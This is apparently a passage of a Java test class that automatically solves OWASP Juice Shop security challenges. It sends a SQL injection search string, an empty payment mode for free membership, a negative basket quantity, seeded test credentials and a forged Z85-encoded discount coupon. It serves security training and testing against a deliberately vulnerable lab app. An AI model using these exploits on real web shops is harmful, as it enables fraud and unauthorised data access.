    public void testDeluxeFraudChallenge() throws Exception {
        String email = "deluxe-test-" + System.nanoTime() + "@example.com";
        String password = "Password123!";
        var registration = api.post("/api/Users/", java.util.Map.of("email", email,
                "password", password, "passwordRepeat", password));
        Assert.assertTrue(registration.statusCode() == 200 || registration.statusCode() == 201,
                "Could not create the standard customer used for the deluxe test.");

        var session = api.login(email, password);
        var response = api.post("/rest/deluxe-membership", java.util.Map.of("paymentMode", ""), session.token());

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Deluxe membership request was rejected.");
        assertChallengeSolved("Deluxe Fraud");
    }


    @Test(priority = 90)
    public void testChristmasSpecialChallenge() throws Exception {
        var session = api.login();

        var search = api.get("/rest/products/search?q=" + encodePathQuery("'))--"));
        ScreenshotManager.captureResponse(ZapManager.getDriver(), search);

        Assert.assertEquals(search.statusCode(), 200, "Christmas Special SQL injection request failed.");

        int productId = productIdByName(search.body(), "Christmas Super-Surprise-Box");
        Assert.assertTrue(productId > 0, "Christmas special was not returned by the injected search.");

        addProductToOwnBasket(session, 1, 1);
        var response = addProductToOwnBasket(session, productId, 1);

        Assert.assertTrue(response.statusCode() == 200 || response.statusCode() == 201,
                "Christmas special was not added to the basket. HTTP " + response.statusCode());

        var checkout = api.post("/rest/basket/" + session.basketId() + "/checkout",
                java.util.Map.of(), session.token());

        ScreenshotManager.captureResponse(ZapManager.getDriver(), checkout);
        Assert.assertTrue(checkout.statusCode() >= 200 && checkout.statusCode() < 300,
                "Christmas special checkout failed. HTTP " + checkout.statusCode());

        assertChallengeSolved("Christmas Special");
    }



    @Test(priority = 91)
    public void testPaybackTimeChallenge() throws Exception {
        var session = api.login();
        var driver = ZapManager.getDriver();
        var json = new org.openqa.selenium.json.Json();

        var basketResponse = api.get("/rest/basket/" + session.basketId(), session.token());
        Assert.assertEquals(basketResponse.statusCode(), 200, "Could not retrieve the authenticated user's basket.");

        java.util.Map<?, ?> basketResult = json.toType(basketResponse.body(), java.util.Map.class);
        Assert.assertTrue(basketResult.get("data") instanceof java.util.Map<?, ?>, "Basket response contains no data.");

        java.util.Map<?, ?> basket = (java.util.Map<?, ?>) basketResult.get("data");
        Object productsObject = basket.get("Products");
        int basketItemId = -1;

        if (productsObject instanceof java.util.List<?> products) {
            for (Object product : products) {
                if (!(product instanceof java.util.Map<?, ?> entry)) continue;
                if (!(entry.get("BasketItem") instanceof java.util.Map<?, ?> item)) continue;
                if (!(item.get("id") instanceof Number id)) continue;
                basketItemId = id.intValue();
                break;
            }
        }

        if (basketItemId < 1) {
            var catalogResponse = api.get("/api/Products");
            Assert.assertEquals(catalogResponse.statusCode(), 200, "Could not retrieve the product catalog.");

            java.util.Map<?, ?> catalog = json.toType(catalogResponse.body(), java.util.Map.class);
            Assert.assertTrue(catalog.get("data") instanceof java.util.List<?>, "Product catalog is unavailable.");

            int productId = -1;
            for (Object product : (java.util.List<?>) catalog.get("data")) {
                if (product instanceof java.util.Map<?, ?> entry && entry.get("id") instanceof Number id) {
                    productId = id.intValue();
                    break;
                }
            }

            Assert.assertTrue(productId > 0, "No product was available to prepare the basket.");

            var added = addProductToOwnBasket(session, productId, 1);
            ScreenshotManager.captureResponse(driver, added);
            Assert.assertTrue(added.statusCode() == 200 || added.statusCode() == 201,
                    "Basket preparation failed. HTTP " + added.statusCode());

            basketItemId = recordId(added.body());
        }

        var response = api.put("/api/BasketItems/" + basketItemId,
                java.util.Map.of("quantity", -100), session.token());

        ScreenshotManager.captureResponse(driver, response);
        Assert.assertEquals(response.statusCode(), 200,
                "Negative basket quantity update failed. HTTP " + response.statusCode());

        var checkout = api.post("/rest/basket/" + session.basketId() + "/checkout",
                java.util.Map.of(), session.token());

        ScreenshotManager.captureResponse(driver, checkout);
        Assert.assertTrue(checkout.statusCode() >= 200 && checkout.statusCode() < 300,
                "Payback Time checkout failed. HTTP " + checkout.statusCode());

        assertChallengeSolved("Payback Time");
    }


    @Test(priority = 92)
    public void testExposedCredentialsChallenge() throws Exception {
        var session = api.login("testing@juice-sh.op", "IamUsedForTesting");
        var response = api.get("/rest/user/whoami", session.token());

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Seeded testing account authentication failed.");
        assertChallengeSolved("Exposed Credentials");
    }

    @Test(priority = 93)
    public void testForgedCouponChallenge() throws Exception {
        var session = api.login();
        var driver = ZapManager.getDriver();
        var json = new org.openqa.selenium.json.Json();

        var basketResponse = api.get("/rest/basket/" + session.basketId(), session.token());
        Assert.assertEquals(basketResponse.statusCode(), 200, "Could not retrieve the authenticated basket.");

        java.util.Map<?, ?> result = json.toType(basketResponse.body(), java.util.Map.class);
        Assert.assertTrue(result.get("data") instanceof java.util.Map<?, ?>, "Basket response is missing data.");

        java.util.Map<?, ?> basket = (java.util.Map<?, ?>) result.get("data");
        Assert.assertTrue(basket.get("Products") instanceof java.util.List<?>, "Basket products are missing.");

        java.util.List<?> products = (java.util.List<?>) basket.get("Products");

        if (products.isEmpty()) {
            var catalogResponse = api.get("/api/Products");
            Assert.assertEquals(catalogResponse.statusCode(), 200, "Product catalog request failed.");

            java.util.Map<?, ?> catalog = json.toType(catalogResponse.body(), java.util.Map.class);
            Assert.assertTrue(catalog.get("data") instanceof java.util.List<?>, "Product catalog is empty or invalid.");

            int productId = -1;
            for (Object product : (java.util.List<?>) catalog.get("data")) {
                if (product instanceof java.util.Map<?, ?> entry && entry.get("id") instanceof Number id) {
                    productId = id.intValue();
                    break;
                }
            }

            Assert.assertTrue(productId > 0, "No valid product was found.");

            var added = addProductToOwnBasket(session, productId, 1);
            ScreenshotManager.captureResponse(driver, added);
            Assert.assertTrue(added.statusCode() == 200 || added.statusCode() == 201,
                    "Basket preparation failed. HTTP " + added.statusCode());
        }

        String couponPlaintext = java.time.LocalDate.now().format(
                        java.time.format.DateTimeFormatter.ofPattern("MMMyy", java.util.Locale.ENGLISH))
                .toUpperCase(java.util.Locale.ROOT) + "-99";

        String couponCode = z85Encode(couponPlaintext);
        var response = api.put("/rest/basket/" + session.basketId() + "/coupon/" + encodePathQuery(couponCode),
                java.util.Map.of(), session.token());

        ScreenshotManager.captureResponse(driver, response);
        Assert.assertEquals(response.statusCode(), 200,
                "Forged coupon was rejected. HTTP " + response.statusCode());

        var checkout = api.post("/rest/basket/" + session.basketId() + "/checkout",
                java.util.Map.of(), session.token());

        ScreenshotManager.captureResponse(driver, checkout);
        Assert.assertTrue(checkout.statusCode() >= 200 && checkout.statusCode() < 300,
                "Forged coupon checkout failed. HTTP " + checkout.statusCode());

        assertChallengeSolved("Forged Coupon");
    }


    private java.net.http.HttpResponse<String> addProductToOwnBasket(JuiceShopApi.JuiceSession session, int productId, int quantity) throws Exception {
        return api.post("/api/BasketItems/", java.util.Map.of("BasketId", session.basketId(),
                "ProductId", productId, "quantity", quantity), session.token());
    }

    @SuppressWarnings("unchecked")
    private int productIdByName(String body, String expectedName) {
        java.util.Map<String, Object> result = new org.openqa.selenium.json.Json().toType(body, java.util.Map.class);
        Object data = result.get("data");
        if (!(data instanceof java.util.List<?> products)) return -1;

        for (Object item : products) {
            if (!(item instanceof java.util.Map<?, ?> product)) continue;
            if (!String.valueOf(product.get("name")).contains(expectedName)) continue;
            if (product.get("id") instanceof Number id) return id.intValue();
        }
        return -1;
    }

    private int recordId(String body) {
        java.util.Map<?, ?> result = new org.openqa.selenium.json.Json().toType(body, java.util.Map.class);
        if (result.get("data") instanceof java.util.Map<?, ?> record && record.get("id") instanceof Number id)
            return id.intValue();
        throw new IllegalStateException("Basket item response did not contain an ID.");
    }

    private String encodePathQuery(String value) {
        return java.net.URLEncoder.encode(value, java.nio.charset.StandardCharsets.UTF_8);
    }

    private String z85Encode(String text) {
        String alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#";
        byte[] bytes = text.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        if (bytes.length % 4 != 0) throw new IllegalArgumentException("Z85 input length must be a multiple of 4.");

        StringBuilder result = new StringBuilder(bytes.length * 5 / 4);
        for (int i = 0; i < bytes.length; i += 4) {
            long value = ((bytes[i] & 0xffL) << 24) | ((bytes[i + 1] & 0xffL) << 16)
                    | ((bytes[i + 2] & 0xffL) << 8) | (bytes[i + 3] & 0xffL);
            char[] encoded = new char[5];
            for (int pos = 4; pos >= 0; pos--) {
                encoded[pos] = alphabet.charAt((int) (value % 85));
                value /= 85;
            }
            result.append(encoded);
        }
        return result.toString();
    }

    @Test(priority = 999)
    public void testMassDispelChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);
        new LoginPage(driver).dismissInitialOverlays();

        actions.dismissChallengeNotifications(driver);
        actions.waitForChallenge("Mass Dispel");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Mass Dispel");
    }

    @Test(priority = 1000)
    public void testScoreBoardChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);
        new LoginPage(driver).dismissInitialOverlays();

        ScoreBoardPage scoreBoard = new ScoreBoardPage(driver);
        scoreBoard.open(baseUrl);
        Assert.assertTrue(scoreBoard.isOpen(), "Score Board page did not load.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Score Board");
    }

    private void assertChallengeSolved(String challengeName) throws Exception {
        Assert.assertTrue(api.isChallengeSolved(challengeName), "Challenge not completed: " + challengeName);
        System.out.println("[SOLVED] " + challengeName);
    }
}
